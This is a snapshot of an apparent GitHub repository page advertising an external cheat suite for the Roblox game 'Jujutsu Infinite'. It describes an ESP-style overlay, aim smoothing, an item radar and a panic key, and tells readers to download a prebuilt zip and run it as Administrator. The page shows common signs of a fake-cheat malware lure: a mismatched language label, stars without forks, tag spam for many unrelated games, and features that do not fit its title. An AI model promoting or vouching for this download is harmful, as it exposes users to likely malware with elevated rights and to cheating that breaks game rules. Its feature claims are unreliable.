---
title: "tomsilvaio03l5/jujutsu-infinite-script-external"
owner: "tomsilvaio03l5"
name: "jujutsu-infinite-script-external"
fullName: "tomsilvaio03l5/jujutsu-infinite-script-external"
description: "Jujutsu Infinite Script — Auto-Spin Special Grade Innates, Boss Raid Macro & Domain Unlocker (External Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release."
sourceUrl: "https://github.com/tomsilvaio03l5/jujutsu-infinite-script-external"
stars: 277
forks: 0
language: "Jupyter Notebook"
topics: ["arise-crossover-script", "blox-fruits-script", "cmake", "configuration", "cpp", "dead-rails-script", "directx-11", "directx-12"]
license: "NOASSERTION"
homepage: "https://tomsilvaio03l5.github.io/jujutsu-infinite-script-external/"
defaultBranch: "main"
snapshotDate: "2026-11-23"
pushedAt: "2026-11-22T02:03:26Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Jujutsu Infinite Script — Auto-Spin Special Grade Innates, Boss Raid Macro & Domain Unlocker (External Suite)

Jujutsu Infinite Script — Auto-Spin Special Grade Innates, Boss Raid Macro & Domain Unlocker (External Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.

*图片：CI Build*
*图片：Latest Release*
*图片：Total Downloads*
*图片：Stars*
[*图片：Open in Colab*](https://colab.research.google.com/github/tomsilvaio03l5/jujutsu-infinite-script-external/blob/main/notebooks/quickstart.ipynb)


Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Build from Source


---

## Overview

**Jujutsu Infinite Script — Auto-Spin Special Grade Innates, Boss Raid Macro & Domain Unlocker (External Suite)** (`jujutsu-infinite-script-external`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab `jujutsu-infinite-script-external-v1.2.0-win64.zip` directly from **Releases**.

## Quick Start (Prebuilt Release)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | **`jujutsu-infinite-script-external-v1.2.0-win64.zip`** | `SHA256SUMS.txt` |

1. Download `jujutsu-infinite-script-external-v1.2.0-win64.zip` from the table above or the **Releases** section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Architecture & Modules

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Viewport Overlay** | Borderless DX11/DX12 composition swapchain with DPI scaling | `INSERT` toggle, custom distance cutoff (`350m`) |
| **Entity & Loot Filter** | Spatial bounding boxes, health/distance readout, rarity tier mask | Live JSON hot-reload (`min_rarity_tier`) |
| **Input Smoothing** | Configurable FOV radius and human-curve interpolation | Adjustable `smoothing_factor` & `fov_radius` |
| **Emergency Unload** | Instant thread teardown and handle release | `END` panic key |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "renderer": {
    "backend": "dx11",
    "vsync": false,
    "max_fps": 144,
    "dpi_aware": true,
    "toggle_key": "INSERT",
    "panic_key": "END"
  },
  "modules": {
    "visual_overlay": {
      "enabled": true,
      "draw_bounds": true,
      "draw_distance": true,
      "max_distance_m": 350
    },
    "telemetry_hud": {
      "enabled": true,
      "frame_time_graph": false,
      "compact_mode": true
    },
    "input_filter": {
      "enabled": true,
      "smoothing_factor": 1.45,
      "fov_radius": 65.0
    },
    "item_radar": {
      "enabled": true,
      "min_rarity_tier": 2
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/tomsilvaio03l5/jujutsu-infinite-script-external.git
cd jujutsu-infinite-script-external
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
Indexed tags: blox-fruits-script, fisch-script, rivals-script, dead-rails-script, arise-crossover-script, blue-lock-rivals-script, basketball-zero-script, jujutsu-infinite-script, ghoul-re-script, bgsi-script, grow-a-garden-script, da-hood-script, pet-simulator-99-script, mm2-script, blade-ball-script, doors-script
